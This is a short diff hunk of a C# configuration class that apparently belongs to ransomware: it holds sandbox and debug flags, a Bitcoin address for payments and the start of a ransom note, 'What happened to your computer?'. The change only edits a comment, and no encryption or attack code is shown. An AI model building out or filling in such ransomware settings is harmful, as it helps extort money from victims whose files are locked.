@@ -9,8 +9,8 @@
         public bool sandBox = false; // Safemode for testing/debugging
         public string sandBoxDirectory = currentWorkingDirectory + @"\sandboxedDirectory";
         public bool debugMode = true; // Debug mode will enable/disable display of the Debug Console/GUI
-
-        // Application configuration
+        
+        // GUI Application configuration
         public string cryptoAddress = "1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2"; // insert Bitcoin/Litecoin/Zcash address here
         public string customDisplayMessage =
 @"What happened to your computer?
